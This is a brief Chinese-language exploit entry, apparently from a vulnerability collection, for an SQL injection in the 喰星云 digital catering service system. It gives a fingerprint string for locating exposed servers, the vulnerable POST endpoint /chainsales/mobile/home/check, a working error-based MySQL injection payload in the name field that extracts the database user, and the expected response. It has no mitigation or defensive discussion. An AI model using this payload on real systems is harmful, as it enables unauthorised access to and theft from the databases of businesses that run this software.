# 喰星云·数字化餐饮服务系统check存在SQL注入漏洞

喰星云·数字化餐饮服务系统 ｜ SQL注入 ｜ —
- **指纹**：`body="tmp_md5_pwd"`
- **请求**：`POST /chainsales/mobile/home/check HTTP/1.1`

**Payload**
```
name=%' AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1=1,user()))),0x7e),8475) AND '1%'='1&pwd=123
```
- **响应特征**：200